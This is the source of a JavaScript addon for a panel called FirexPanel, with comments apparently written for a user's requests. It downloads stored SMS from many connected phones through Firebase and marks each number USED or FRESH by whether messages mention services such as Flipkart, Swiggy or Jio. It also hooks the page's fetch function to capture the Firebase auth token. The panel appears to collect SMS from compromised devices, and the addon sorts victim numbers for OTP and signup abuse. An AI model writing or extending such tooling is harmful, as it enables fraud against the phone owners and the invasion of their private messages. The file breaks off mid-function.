/* ============================================================================
 * FirexPanel — Message Keyword Checker + number stars  (ADDON, 2026-11-18)
 * ============================================================================
 * WHAT IT IS
 *   A standalone addon for the FirexPanel (Dj repo copy). The panel ships
 *   ONLY as a built bundle (assets/index-FPfix2025.js) — there is no
 *   frontend source in the repo — so new UI cannot be added to the React
 *   app itself. This file therefore lives BESIDE the bundle and augments
 *   the panel from the outside: it reads the same Firebase the panel uses,
 *   renders its own checker section above the numbers list, and decorates
 *   the panel's own number cards with USED/FRESH badges + a star button.
 *   It never touches React state, never edits the bundle, and never sends
 *   anything anywhere except the user's own Firebase (plain GETs).
 *
 * FEATURES (requested 2026-11-18, reference: the blinkit SMS-scan bot +
 *   the screenshot the user sent)
 *   1. MESSAGE KEYWORD CHECKER — pick a keyword (preset pills or a custom
 *      search) and every ONLINE number is classified by scanning its own
 *      SMS (last 150 per device, exactly like the blinkit SMS-scan bot):
 *        USED  = at least one SMS whose sender OR text contains the
 *                keyword (case-insensitive substring).
 *        FRESH = no SMS contains the keyword.
 *      The section shows "Active: <keyword>", "<N> USED" / "<M> FRESH"
 *      counts, a progress line while checking, and a Clear button that
 *      resets the keyword and removes the badges.
 *   2. STAR ON EVERY NUMBER — a star button on each number card. Tap it
 *      to star a number you have used; tap again to unstar. Stars persist
 *      in localStorage (key "firex_starred") so they survive reloads.
 *      A "Starred only" toggle shows only starred numbers, so at a glance
 *      you can tell which numbers are used (starred) and which are not.
 *   3. NO SELECTOR (2026-11-19, user order) — there is NO account
 *      selector at all. The checker simply runs on whichever Firebase
 *      is logged in right now in the panel, detected from the device
 *      cards on screen (the card-match pick). No picker, no saved
 *      choice, nothing to tap — log in to a Firebase and the checker
 *      works on that one only.
 *
 * DATA FLOW (step by step)
 *   a. Accounts: read localStorage "flixy_accounts" (the panel's own key),
 *      normalised exactly like the panel does (url = url||firebaseUrl,
 *      key = key||apiKey||name). If there are several accounts the checker
 *      uses the one whose device ids match the cards on screen; a <select>
 *      in the checker section lets the user switch by hand.
 *   b. Numbers: GET <base>/clients.json?auth=<key> (same endpoint the
 *      panel uses). A device is ONLINE when its client record has a
 *      truthy "status" field — the same rule the panel uses.
 *   c. SMS: for every online device, GET
 *      <base>/messages/<deviceId>.json?auth=<key>&orderBy="$key"
 *      &limitToLast=150 (same endpoint + params the panel uses when you
 *      open a number). Fetched in parallel batches of 8 with a progress
 *      line. Messages are cached in memory per device, so switching
 *      keywords does not re-download SMS.
 *   d. Matching: keyword lower-cased; a message matches when the keyword
 *      appears in its sender OR its text (case-insensitive substring).
 *      Message shape (same as the blinkit SMS-scan bot):
 *        { "message"|"body"|"text": str, "sender"|"from": str, ... }
 *   e. Rendering: the checker section is injected before the numbers
 *      grid. Cards are decorated by a MutationObserver (the panel
 *      re-renders its list every ~15s, so decoration must re-apply):
 *      the device id is read from the card's mono id <p>, a USED/FRESH
 *      badge is appended inside the name <h3>, and a star button is put
 *      in the header's right-hand icon row. Stars + the starred-only
 *      filter are re-applied by the same observer.
 *
 * SAFETY / LIMITS
 *   - Read-only: only GET requests to the user's own Firebase. No writes,
 *     no third-party calls, no API key needed (this is the SMS-scan
 *     flavour of the checker, NOT the tubesave.in API flavour).
 *   - The panel's own fetch helper rejects non-Firebase URLs; this addon
 *     deliberately does NOT validate the domain, so it can also be tested
 *     against a local mock Firebase.
 *   - If anything fails (no account, Firebase down, no numbers) the
 *     checker shows a plain message and the panel keeps working as before.
 * ========================================================================== */
(function () {
  "use strict";

  /* ------------------------------------------------------------------ */
  /* 1. Constants — presets, storage keys, limits                        */
  /* ------------------------------------------------------------------ */

  // Keyword presets (same set as the screenshot the user sent).
  var PRESETS = ["indane", "myjio", "google", "camiat", "flipkart",
    "swiggy", "blinkit", "meesho", "bigbasket", "ajio"];

  var LS_ACCOUNTS = "flixy_accounts";   // the panel's own accounts key
  // Per-account storage (2026-11-18): stars + keyword are stored as a MAP
  // keyed by the account's Firebase URL, so each logged-in account keeps
  // its OWN stars and keyword. Old flat values (a plain array for stars,
  // a plain string for the keyword) are migrated to the current account
  // on first read, so nothing the user already starred is lost.
  var LS_STARRED = "firex_starred";     // {firebaseUrl: [deviceId, ...]}
  var LS_KEYWORD = "firex_checker_kw";  // {firebaseUrl: keyword}
  // NO persisted selector choice (2026-11-19, user order): the selector's
  // pick is deliberately NOT saved. Saving it was wrong — on a NEW login
  // the old choice stayed applied and the checker kept scanning the old
  // Firebase. The checker simply follows whichever Firebase is logged
  // in right now (detected from the cards on screen). The selector is
  // optional: the user uses it only when he wants to switch accounts.

  var SMS_LIMIT = 150;                  // SMS per device (panel uses the same)
  var FETCH_BATCH = 8;                  // parallel message fetches
  var FETCH_TIMEOUT_MS = 15000;         // Firebase fetch timeout — same 15s
                                        // as the panel's own fetch helper.
                                        // Without this a slow/dead Firebase
                                        // left the checker stuck on
                                        // "Numbers load ho rahe hain…" forever
                                        // (2026-11-18: user saw the panel
                                        // stuck on "Connecting…").
  var MIN_KW_LEN = 2;                   // shorter keywords match everything

  /* ------------------------------------------------------------------ */
  /* 2. State — everything the addon remembers while the page is open    */
  /* ------------------------------------------------------------------ */

  var state = {
    accounts: [],          // normalised {url, key, label} list
    accountIndex: 0,       // which account the checker is using
    accountPicked: false,  // the panel's open account has been identified
    keyword: "",           // active keyword ("" = checker idle)
    checking: false,       // a scan is running right now
    checkStartedAt: 0,     // when the current scan started (stuck-guard)
    progress: { done: 0, total: 0 },
    used: {},              // deviceId -> true  (keyword found in SMS)
    fresh: {},             // deviceId -> true  (no SMS matched)
    smsCache: {},          // deviceId -> [{sender, text}] (in-memory only)
    starredOnly: false,    // starred-only filter is on
  };

  /* ------------------------------------------------------------------ */
  /* 3. Small helpers                                                    */
  /* ------------------------------------------------------------------ */

  function $(sel, root) { return (root || document).querySelector(sel); }
  function $all(sel, root) { return Array.prototype.slice.call((root || document).querySelectorAll(sel)); }

  function el(tag, cls, text) {
    var n = document.createElement(tag);
    if (cls) n.className = cls;
    if (text !== undefined && text !== null) n.textContent = text;
    return n;
  }

  function esc(s) {
    return String(s == null ? "" : s).replace(/[&<>"']/g, function (c) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
    });
  }

  /* ------------------------------------------------------------------ */
  /* 4. Accounts — read the panel's own saved Firebase accounts          */
  /* ------------------------------------------------------------------ */

  // Normalised exactly like the panel does (see its V0() helper):
  // url = url || firebaseUrl, key = key || apiKey || name.
  // The key may be empty (a public Firebase needs no auth) — an account
  // with a URL but no key is still usable, so the filter keeps it.
  function readAccounts() {
    try {
      var raw = JSON.parse(localStorage.getItem(LS_ACCOUNTS) || "[]");
      if (!Array.isArray(raw)) return [];
      return raw.map(function (a) {
        return {
          url: (a.url || a.firebaseUrl || "").replace(/\/$/, ""),
          key: a.key || a.apiKey || a.name || "",
          label: a.firebaseUrl || a.url || a.name || "Firebase",
        };
      }).filter(function (a) { return !!a.url; });
    } catch (e) { return []; }
  }

  /* ------------------------------------------------------------------ */
  /* 4b. Live-account detection — the DEEP fix (2026-11-19)               */
  /* ------------------------------------------------------------------ */
  // The checker used to read the logged-in Firebase ONLY from
  // localStorage "flixy_accounts". But the panel can be CONNECTED
  // (showing devices, "Connected" in the top bar) while that key is
  // empty — e.g. logged in via a share link that never saved to
  // localStorage, or a deployment whose storage differs. The checker
  // then said "Pehle panel me apna Firebase account connect karo."
  // even though the panel was Connected with devices on screen
  // (screenshot 2026-11-19 00:36, firexpanel.com: 19 devices, 3 online).
  // Fix: snoop the Firebase URL the panel ITSELF fetches from (its
  // /clients.json and /messages calls) and treat THAT as the live
  // account. The panel auto-refreshes every ~15s, so the live account
  // is captured quickly even if the first fetch happened before this
  // addon loaded. This makes the checker follow the panel's real
  // connection instead of trusting localStorage alone.
  var liveAccount = null; // {url, key, label} captured from panel fetches

  function registerLiveAccount(url, key) {
    if (!url) return;
    url = String(url).replace(/\/$/, "");
    var k = key || "";
    if (liveAccount && liveAccount.url === url && liveAccount.key === k) return;
    liveAccount = { url: url, key: k, label: url };
    // Make the live account visible to the per-account logic: add it to
    // state.accounts (in-memory only) if it is not there, and make it
    // the active account. Per-account stars/keyword then key off the
    // live Firebase URL, which is the Firebase actually logged in.
    var idx = -1;
    state.accounts.forEach(function (a, i) {
      if (String(a.url).replace(/\/$/, "") === url) idx = i;
    });
    if (idx === -1) {
      state.accounts.push(liveAccount);
      idx = state.accounts.length - 1;
    }
    if (state.accountIndex !== idx) {
      setAccount(idx);
    } else {
      loadStarredForCurrentAccount();
      state.keyword = readKeywordForCurrentAccount();
      updateActivePill();
      updateCounts();
      decorateCards();
    }
    // If the checker was showing "connect karo", clear it now — the
    // account is here, the user just needs to pick a keyword.
    var st = $("#fx-checker-status");
    if (st && st.textContent.indexOf("Pehle panel") === 0) {
      setStatusLine(state.keyword
        ? 'Active: "' + state.keyword + '" — Refresh dabao ya keyword dobara chuno.'
        : "Account mil gaya — keyword chuno ya Search Now dabao.");
    }
  }

  // Wrap window.fetch once, to capture the Firebase RTDB the panel is
  // actually using. Only data paths (/clients.json, /messages/...) are
  // recorded; everything else passes through untouched. Never breaks
  // the panel's fetch — any error in the spy is swallowed and the
  // original fetch still runs.
  function installFetchSpy() {
    if (typeof window.fetch !== "function") return;
    if (window.fetch.__fxSpy) return; // already wrapped
    var origFetch = window.fetch.bind(window);
    function spyFetch(input, init) {
      try {
        var urlStr = (typeof input === "string") ? input : (input && input.url) || "";
        // Real Firebase: the RTDB host is the URL host, e.g.
        // https://<db>.firebaseio.com/clients.json
        // Mock (local test server): the RTDB host is a path prefix, e.g.
        // http://127.0.0.1:8902/firebasedatabase.app/clients.json
        // Both are accepted; m[1] is the Firebase base URL either way.
        var m = urlStr.match(/^(https?:\/\/[^\/]+\.(?:firebaseio\.com|firebasedatabase\.app))(\/.*)?$/i)
          || urlStr.match(/^(https?:\/\/[^\/]+\/(?:firebaseio\.com|firebasedatabase\.app))(\/.*)?$/i);
        if (m && /\/clients\.json|\/messages\//.test(urlStr)) {
          var auth = "";
          try { auth = new URL(urlStr).searchParams.get("auth") || ""; } catch (e) { auth = ""; }
          registerLiveAccount(m[1], auth);
        }
      } catch (e) { /* never break the panel's fetch */ }
      return origFetch(input, init);
    }
    spyFetch.__fxSpy = true;
    window.fetch = spyFetch;
  }

  function activeAccount() {
    return state.accounts[state.accountIndex] || null;
  }

  // Stable per-account key for the per-account maps: the Firebase URL,
  // lower-cased and without a trailing slash. Two saved entries for the
  // same Firebase (different key) share one stars/keyword entry, which
  // is what the user wants — the data belongs to the Firebase, not to
  // the saved-entry row.
  function accountKey(acct) {
    return (acct && acct.url ? acct.url : "").toLowerCase();
  }

  // Read a per-account map from localStorage. Returns {} when missing or
  // broken. A legacy flat value (array for stars, string for keyword) is
  // migrated to the CURRENT account's entry so old data is not lost.
  function readAccountMap(lsKey, legacyKind) {
    var map = {};
    try {
      var raw = JSON.parse(localStorage.getItem(lsKey) || "null");
      if (raw && typeof raw === "object" && !Array.isArray(raw)) map = raw;
      else if (legacyKind === "array" && Array.isArray(raw)) {
        var k = accountKey(activeAccount());
        if (k) map[k] = raw;
      } else if (legacyKind === "string" && typeof raw === "string") {
        var k2 = accountKey(activeAccount());
        if (k2) map[k2] = raw;
      }
    } catch (e) { map = {}; }
    return map;
  }

  function writeAccountMap(lsKey, map) {
    try { localStorage.setItem(lsKey, JSON.stringify(map)); } catch (e) {}
  }

  /* ------------------------------------------------------------------ */
  /* 5. Firebase reads — plain GETs, same endpoints the panel uses       */
  /* ------------------------------------------------------------------ */

  function fbUrl(base, key, path, params) {
    // A public Firebase needs no auth: omit the auth param entirely
    // when the key is empty (an empty auth= can be rejected), instead
    // of sending a blank token.
    var q = new URLSearchParams();
    if (key) q.set("auth", key);
    if (params) Object.keys(params).forEach(function (k) { q.set(k, params[k]); });
    var qs = q.toString();
    return base + "/" + path + ".json" + (qs ? "?" + qs : "");
  }

  // Firebase GET with a hard timeout. The panel's own fetch helper aborts
  // after 15s; this addon must do the same, otherwise a slow or dead
  // Firebase leaves a pending promise that never resolves — the checker
  // would sit on "Numbers load ho rahe hain…" and never show an error.
  // On timeout the promise rejects (AbortError) and the callers' .catch
  // handlers show a plain message and reset the checker state.
  function fbGet(base, key, path, params) {
    var url = fbUrl(base, key, path, params);
    // Old browsers without AbortController: plain fetch (no timeout).
    if (typeof AbortController === "undefined") {
      return fetch(url, { headers: { Accept: "application/json" } })
        .then(function (r) {
          if (!r.ok) throw new Error("Firebase HTTP " + r.status);
          return r.json();
        });
    }
    var ctrl = new AbortController();
    var timer = setTimeout(function () { ctrl.abort(); }, FETCH_TIMEOUT_MS);
    return fetch(url, {
      headers: { Accept: "application/json" },
      signal: ctrl.signal,
    })
      .then(function (r) {
        clearTimeout(timer);
        if (!r.ok) throw new Error("Firebase HTTP " + r.status);
        return r.json();
      })
      .catch(function (err) {
        clearTimeout(timer);
        if (err && err.name === "AbortError") {
          throw new Error("Firebase timeout (" + (FETCH_TIMEOUT_MS / 1000) + "s)");
        }
        throw err;
      });
  }

  // GET /clients.json -> [{id, status, phoneNumber, ...}]. A device is
  // ONLINE when its client record has a truthy "status" — the panel's rule.
  function fetchClients(acct) {
    return fbGet(acct.url, acct.key, "clients").then(function (data) {
      var out = [];
      if (!data || typeof data !== "object") return out;
      Object.keys(data).forEach(function (id) {
        var c = data[id];
        if (!c || typeof c !== "object") return;
        out.push({
          id: id,
          status: !!c.status,
          phone: c.phoneNumber || (c.phoneNumbers && c.phoneNumbers[0]) || "",
        });
      });
      return out;
    });
  }

  // GET /messages/<deviceId>.json (last 150) -> [{sender, text}].
  // Message shape (blinkit SMS-scan bot): {message|body|text, sender|from}.
  function fetchDeviceSms(acct, deviceId) {
    if (state.smsCache[deviceId]) return Promise.resolve(state.smsCache[deviceId]);
    return fbGet(acct.url, acct.key, "messages/" + encodeURIComponent(deviceId),
      { orderBy: '"$key"', limitToLast: String(SMS_LIMIT) })
      .then(function (data) {
        var list = [];
        if (data && typeof data === "object") {
          Object.keys(data).forEach(function (mid) {
            var m = data[mid];
            if (!m || typeof m !== "object") return;
            list.push({
              sender: String(m.sender || m.from || ""),
              text: String(m.message || m.body || m.text || ""),
            });
          });
        }
        state.smsCache[deviceId] = list;
        return list;
      })
      .catch(function () {
        // One dead inbox must not kill the whole scan — treat as no SMS.
        state.smsCache[deviceId] = [];
        return [];
      });
  }

  /* ------------------------------------------------------------------ */
  /* 6. Keyword matching — sender OR text, case-insensitive substring    */
  /* ------------------------------------------------------------------ */

  function smsMatches(smsList, kwLower) {
    for (var i = 0; i < smsList.length; i++) {
      var m = smsList[i];
      if ((m.sender || "").toLowerCase().indexOf(kwLower) !== -1) return true;
      if ((m.text || "").toLowerCase().indexOf(kwLower) !== -1) return true;
    }
    return false;
  }

  /* ------------------------------------------------------------------ */
  /* 7. Stars — persisted PER Firebase account in localStorage           */
  /* ------------------------------------------------------------------ */

  // Stars for the CURRENT account only. The map is re-read from
  // localStorage whenever the account changes, so switching accounts
  // shows that account's own stars.
  function readStarred() {
    var map = readAccountMap(LS_STARRED, "array");
    var k = accountKey(activeAccount());
    var set = {};
    var list = (k && Array.isArray(map[k])) ? map[k] : [];
    list.forEach(function (id) { set[id] = true; });
    return set;
  }

  function writeStarred(set) {
    var map = readAccountMap(LS_STARRED, "array");
    var k = accountKey(activeAccount());
    if (!k) return;
    map[k] = Object.keys(set);
    writeAccountMap(LS_STARRED, map);
  }

  // The starred set for the account the checker is currently using.
  // Re-loaded by setAccount() whenever the account changes.
  var starred = {};

  function loadStarredForCurrentAccount() {
    starred = readStarred();
  }

  function toggleStar(deviceId) {
    if (starred[deviceId]) delete starred[deviceId];
    else starred[deviceId] = true;
    writeStarred(starred);
    decorateCards(); // re-render this card's star + re-apply the filter
  }

  // Switch the checker's account (stars + keyword + SMS cache) to idx.
  // Used by pickAccountByCards() at boot and by the account selector.
  function setAccount(idx) {
    state.accountIndex = idx;
    state.smsCache = {};
    state.used = {};
    state.fresh = {};
    loadStarredForCurrentAccount();
    state.keyword = readKeywordForCurrentAccount();
    updateActivePill();
    updateCounts();
    decorateCards();
  }

  function readKeywordForCurrentAccount() {
    var map = readAccountMap(LS_KEYWORD, "string");
    var k = accountKey(activeAccount());
    return (k && typeof map[k] === "string") ? map[k] : "";
  }

  function writeKeywordForCurrentAccount(kw) {
    var map = readAccountMap(LS_KEYWORD, "string");
    var k = accountKey(activeAccount());
    if (!k) return;
    if (kw) map[k] = kw;
    else delete map[k];
    writeAccountMap(LS_KEYWORD, map);
  }

  /* ------------------------------------------------------------------ */
  /* 8. The checker run — classify every online number                   */
  /* ------------------------------------------------------------------ */

  function setStatusLine(msg) {
    var n = $("#fx-checker-status");
    if (n) n.textContent = msg;
  }

  function updateCounts() {
    var u = Object.keys(state.used).length;
    var f = Object.keys(state.fresh).length;
    var ue = $("#fx-checker-used");
    var fe = $("#fx-checker-fresh");
    if (ue) ue.textContent = u + " USED";
    if (fe) fe.textContent = f + " FRESH";
  }

  function updateActivePill() {
    var n = $("#fx-checker-active");
    if (n) n.textContent = state.keyword ? 'Active: "' + state.keyword + '"' : 'Active: —';
  }

  // Run the checker for a keyword. Fetches SMS for every online device in
  // parallel batches, classifies USED/FRESH, then repaints counts + badges.
  function runCheck(keyword) {
    keyword = (keyword || "").trim();
    if (keyword.length < MIN_KW_LEN) {
      setStatusLine("Keyword kam se kam " + MIN_KW_LEN + " characters ka hona chahiye.");
      return;
    }
    var acct = activeAccount();
    if (!acct) {
      setStatusLine("Pehle panel me apna Firebase account connect karo.");
      return;
    }
    if (state.checking) {
      // A scan is already running — but if it has been stuck for over
      // 60s (a hung fetch that never settled), reset it and let the new
      // tap start a fresh scan. Without this, one stuck scan made EVERY
      // button do nothing forever ("pura checker toot gya") and the only
      // fix was reloading the page. (2026-11-19 fix.)
      if (Date.now() - (state.checkStartedAt || 0) > 60000) {
        state.checking = false;
        setStatusLine("Pichla scan atak gaya tha — dobara try kar raha hun…");
      } else {
        setStatusLine("Scan chal raha hai — thoda ruko…");
        return;
      }
    }
    state.keyword = keyword;
    writeKeywordForCurrentAccount(keyword); // per-account, not global
    state.checking = true;
    state.checkStartedAt = Date.now();
    state.used = {};
    state.fresh = {};
    updateActivePill();
    updateCounts();
    decorateCards();

    var kwLower = keyword.toLowerCase();
    setStatusLine("Numbers load ho rahe hain…");
    fetchClients(acct).then(function (devices) {
      var online = devices.filter(function (d) { return d.status; });
      state.progress = { done: 0, total: online.length };
      if (!online.length) {
        state.checking = false;
        setStatusLine("Is Firebase me koi online number nahi mila.");
        return;
      }
      setStatusLine("Checking 0/" + online.length + "…");
      var i = 0;
      function nextBatch() {
        var batch = online.slice(i, i + FETCH_BATCH);
        i += batch.length;
        if (!batch.length) {
          state.checking = false;
          setStatusLine("Done — " + online.length + " numbers checked.");
          updateCounts();
          decorateCards();
          return;
        }
        Promise.all(batch.map(function (d) { return fetchDeviceSms(acct, d.id); }))
          .then(function (lists) {
            batch.forEach(function (d, j) {
              if (smsMatches(lists[j], kwLower)) state.used[d.id] = true;
              else state.fresh[d.id] = true;
            });
            state.progress.done = Math.min(i, online.length);
            setStatusLine("Checking " + state.progress.done + "/" + online.length + "…");
            updateCounts();
            decorateCards();
            nextBatch();
          })
          .catch(function (err) {
            // A batch must never leave the checker stuck: reset the flag
            // and show a plain error so the next tap works again.
            // (2026-11-19 fix — a rejected batch used to hang the whole
            // checker with checking=true forever.)
            state.checking = false;
            setStatusLine("Scan ruk gaya: " + (err && err.message ? err.message : err) + " — dobara try karo.");
            updateCounts();
            decorateCards();
          });
      }
      nextBatch();
    }).catch(function (err) {
      state.checking = false;
      setStatusLine("Firebase se data nahi mila: " + (err && err.message ? err.message : err));
    });
  }

  function clearCheck() {
    state.keyword = "";
    state.used = {};
    state.fresh = {};
    writeKeywordForCurrentAccount(""); // clears this account's keyword
    var input = $("#fx-checker-custom");
    if (input) input.value = "";
    updateActivePill();
    updateCounts();
    setStatusLine("Checker cleared — koi keyword active nahi hai.");
    decorateCards();
  }

  /* ------------------------------------------------------------------ */
  /* 9. Checker section DOM — injected above the numbers grid            */
  /* ------------------------------------------------------------------ */

  // Find the numbers grid: the panel renders cards in a
  // div.grid.grid-cols-1...gap-4. Returns null until the list renders.
  function findGrid() {
    var grids = $all("div.grid.gap-4");
    for (var i = 0; i < grids.length; i++) {
      if (grids[i].querySelector(".group.relative")) return grids[i];
    }
    // Grid exists but is empty (no devices yet) — still usable as anchor.
    return grids[0] || null;
  }

  // Find the device id of a card: the mono id <p> in the card header.
  function cardDeviceId(card) {
    var p = card.querySelector("p.text-\\[10px\\].font-mono, p[class*='font-mono']");
    if (p) return (p.textContent || "").trim();
    return "";
  }

  function buildCheckerSection() {
    var sec = el("div", "fx-checker");
    sec.id = "fx-checker";

    // Header row: yellow circled check + title.
    var head = el("div", "fx-checker-head");
    var icon = el("span", "fx-checker-icon", "✓");
    var title = el("span", "fx-checker-title", "MESSAGE KEYWORD CHECKER");
    head.appendChild(icon);
    head.appendChild(title);
    sec.appendChild(head);

    // Active keyword pill.
    var active = el("div", "fx-checker-active", 'Active: —');
    active.id = "fx-checker-active";
    sec.appendChild(active);

    // USED / FRESH counts.
    var counts = el("div", "fx-checker-counts");
    var used = el("span", "fx-pill fx-used", "0 USED");
    used.id = "fx-checker-used";
    var fresh = el("span", "fx-pill fx-fresh", "0 FRESH");
    fresh.id = "fx-checker-fresh";
    counts.appendChild(used);
    counts.appendChild(fresh);
    sec.appendChild(counts);

    // Presets.
    var presets = el("div", "fx-checker-presets");
    presets.appendChild(el("span", "fx-presets-label", "PRESETS:"));
    PRESETS.forEach(function (p) {
      var b = el("button", "fx-preset", p);
      b.type = "button";
      b.addEventListener("click", function () { runCheck(p); });
      presets.appendChild(b);
    });
    sec.appendChild(presets);

    // Custom search + Search button + Clear + starred-only toggle.
    // The Search button is REQUIRED (2026-11-19 fix): the custom search
    // used to work ONLY by pressing Enter, and on a phone the virtual
    // keyboard's Enter/Go key does not reliably fire keydown Enter —
    // so the custom keyword simply did nothing. Now there is a real
    // button to tap, and Enter still works as well.
    var row = el("div", "fx-checker-row");
    var input = el("input", "fx-custom");
    input.id = "fx-checker-custom";
    input.type = "text";
    input.placeholder = "Or custom search";
    input.setAttribute("enterkeyhint", "search");
    input.addEventListener("keydown", function (e) {
      if (e.key === "Enter" || e.keyCode === 13) {
        e.preventDefault();
        runCheck(input.value);
      }
    });
    row.appendChild(input);
    var go = el("button", "fx-go", "Search Now");
    go.id = "fx-checker-go";
    go.type = "button";
    go.addEventListener("click", function () { runCheck(input.value); });
    row.appendChild(go);
    var clear = el("button", "fx-clear", "Clear");
    clear.type = "button";
    clear.addEventListener("click", clearCheck);
    row.appendChild(clear);
    var starToggle = el("button", "fx-star-toggle", "☆ Starred only");
    starToggle.id = "fx-star-toggle";
    starToggle.type = "button";
    starToggle.addEventListener("click", function () {
      state.starredOnly = !state.starredOnly;
      starToggle.textContent = state.starredOnly ? "★ Starred only" : "☆ Starred only";
      starToggle.classList.toggle("fx-on", state.starredOnly);
      applyStarredFilter();
    });
    row.appendChild(starToggle);
    sec.appendChild(row);

    // (No account selector here — user order 2026-11-19: the checker
    // simply runs on whichever Firebase is logged in right now.)

    // Status line (progress / errors / hints).
    var status = el("div", "fx-checker-status", "");
    status.id = "fx-checker-status";
    sec.appendChild(status);

    return sec;
  }

  // Insert the section before the numbers grid (re-insert if React wiped
  // it on a re-render — state lives in JS, so re-inserting is lossless).
  function ensureChecker() {
    if ($("#fx-checker")) return;
    var grid = findGrid();
    if (!grid || !grid.parentNode) return;
    grid.parentNode.insertBefore(buildCheckerSection(), grid);
    updateActivePill();
    updateCounts();
    if (!activeAccount()) {
      setStatusLine("Pehle panel me apna Firebase account connect karo.");
    } else if (state.keyword) {
      setStatusLine('Active: "' + state.keyword + '" — Refresh dabao ya keyword dobara chuno.');
    }
  }

  /* ------------------------------------------------------------------ */
  /* 10. Card decoration — USED/FRESH badge + star button                */
  /* ------------------------------------------------------------------ */

  // The star button lives in the card header's right-hand icon row
  // (the row that already holds the "..." menu button). Idempotent: an
  // existing button is updated in place (text/class/title only change
  // when the starred state changed), so re-decoration never duplicates
  // the button and never triggers a MutationObserver loop.
  function injectStar(card, deviceId) {
    var headerRow = card.querySelector("div.flex.items-center.gap-1");
    if (!headerRow) return;
    var isStarred = !!starred[deviceId];
    var btn = card.querySelector(".fx-star");
    if (btn) {
      var wantText = isStarred ? "★" : "☆";
      if (btn.textContent !== wantText) btn.textContent = wantText;
      btn.classList.toggle("fx-starred", isStarred);
      btn.title = isStarred ? "Starred — dobara dabao to unstar" : "Star karo (used number)";
      return;
    }
    var wrap = el("span", "fx-star-wrap");
    btn = el("button", "fx-star" + (isStarred ? " fx-starred" : ""), isStarred ? "★" : "☆");
    btn.type = "button";
    btn.title = isStarred ? "Starred — dobara dabao to unstar" : "Star karo (used number)";
    btn.addEventListener("click", function (e) {
      e.stopPropagation(); // card ka onClick (detail kholna) na chale
      toggleStar(deviceId);
    });
    wrap.appendChild(btn);
    headerRow.insertBefore(wrap, headerRow.firstChild);
  }

  // The USED/FRESH badge goes inside the name <h3>, right after the name
  // (same line, like the screenshot). Idempotent: the badge is only
  // touched when its kind actually changed, so re-decoration does not
  // keep mutating the DOM (which would re-trigger the observer forever).
  function injectBadge(card, deviceId) {
    var kind = state.used[deviceId] ? "USED" : (state.fresh[deviceId] ? "FRESH" : null);
    var old = card.querySelector(".fx-badge");
    if (!kind) {
      if (old) old.remove();
      return;
    }
    if (old && old.textContent === kind) return; // already correct — leave it
    if (old) old.remove();
    var h3 = card.querySelector("h3");
    if (!h3) return;
    var badge = el("span", "fx-badge fx-badge-" + kind.toLowerCase(), kind);
    h3.appendChild(badge);
  }

  // Hide non-starred cards while the starred-only filter is on.
  function applyStarredFilter() {
    var grid = findGrid();
    if (!grid) return;
    var cards = $all(":scope > div", grid);
    cards.forEach(function (card) {
      var id = cardDeviceId(card);
      card.classList.toggle("fx-hidden-card", state.starredOnly && !starred[id]);
    });
    var toggle = $("#fx-star-toggle");
    if (toggle) {
      toggle.textContent = state.starredOnly ? "★ Starred only" : "☆ Starred only";
      toggle.classList.toggle("fx-on", state.starredOnly);
    }
  }

  // Decorate every card currently in the grid (idempotent: a card that
  // already has a star is skipped; badges are rebuilt from state).
  // NOTE: data-fx-device is only set when it differs — setting the same
  // attribute value again is a needless DOM write that re-triggers the
  // MutationObserver on every pass (2026-11-18 debounce fix).
  function decorateCards() {
    var grid = findGrid();
    if (!grid) return;
    $all(":scope > div", grid).forEach(function (card) {
      var id = cardDeviceId(card);
      if (!id) return;
      if (card.getAttribute("data-fx-device") !== id) card.setAttribute("data-fx-device", id);
      injectStar(card, id);
      injectBadge(card, id);
    });
    applyStarredFilter();
  }

  /* ------------------------------------------------------------------ */
  /* 11. Boot — keep the addon alive across React re-renders             */
  /* ------------------------------------------------------------------ */

  function boot() {
    // Install the fetch spy FIRST so the panel's own Firebase fetches
    // are captured from the start (live-account detection, 2026-11-19).
    installFetchSpy();
    state.accounts = readAccounts();
    // No persisted choice: the checker starts on the first account and
    // the card-match pick below identifies the Firebase actually logged
    // in right now. A new login always wins — no old pick can stick.
    // Stars + keyword belong to the CURRENT account (per-account maps).
    loadStarredForCurrentAccount();
    state.keyword = readKeywordForCurrentAccount();

    // Auto-pick the account whose devices match the cards on screen
    // (the panel's active account). Falls back to the first account.
    // Runs at boot AND retried by the interval until it finds a match:
    // at boot the panel may not have rendered its cards yet (the numbers
    // view loads async), so a single boot-time pass can see an empty
    // grid and give up. Retrying is what makes the selector show the
    // account the panel actually opened after a share-link switch.
    var picking = false; // a pick is already in flight — do not overlap
    function pickAccountByCards() {
      var grid = findGrid();
      if (!grid || state.accounts.length <= 1) return;
      if (picking) return;
      var onScreen = {};
      $all(":scope > div", grid).forEach(function (card) {
        var id = cardDeviceId(card);
        if (id) onScreen[id] = true;
      });
      if (!Object.keys(onScreen).length) return;
      var current = state.accountIndex;
      // Check the accounts one by one (sequential, so we stop at the
      // first match). The current account is checked first.
      var order = [current];
      state.accounts.forEach(function (a, idx) {
        if (idx !== current) order.push(idx);
      });
      picking = true;
      var p = Promise.resolve(false);
      order.forEach(function (idx) {
        p = p.then(function (found) {
          if (found) return true;
          return fetchClients(state.accounts[idx]).then(function (devices) {
            if (devices.some(function (d) { return onScreen[d.id]; })) {
              // The panel's open account is idx — load ITS stars/keyword.
              setAccount(idx);
              state.accountPicked = true;
              return true;
            }
            return false;
          }).catch(function () { return false; });
        });
      });
      p.catch(function () {}).then(function () { picking = false; });
    }

    ensureChecker();
    decorateCards();
    pickAccountByCards();

    // The panel re-renders its list every ~15s — re-ensure the section
    // and re-decorate cards whenever the DOM under #root changes.
    // DEBOUNCED (2026-11-18): a raw observer fires once per DOM mutation,
    // and the numbers view adds ~47 cards + updates each one as its SMS
    // analysis lands — that is hundreds of firings in a burst, each one
    // re-walking all cards. On a phone that jank makes the whole page
    // feel frozen (buttons stop responding). So the observer only
    // SCHEDULES one pass, 150ms after the last mutation in the burst.
    var root = document.getElementById("root");
    if (root && window.MutationObserver) {
      var decoTimer = null;
      var obs = new MutationObserver(function () {
        if (decoTimer) clearTimeout(decoTimer);
        decoTimer = setTimeout(function () {
          decoTimer = null;
          ensureChecker();
          decorateCards();
          // Cards may have just rendered — retry the account pick if
          // the panel's open account is still unidentified.
          if (!state.accountPicked) pickAccountByCards();
        }, 150);
      });
      obs.observe(root, { childList: true, subtree: true });
    }
    // Safety net: a light interval in case the observer misses a render.
    // (5s, not 3s — the observer now handles the fast path.)
    // It also retries the account pick until the panel's open account is
    // identified (the boot-time pick can run before the cards render).
    setInterval(function () {
      ensureChecker();
      decorateCards();
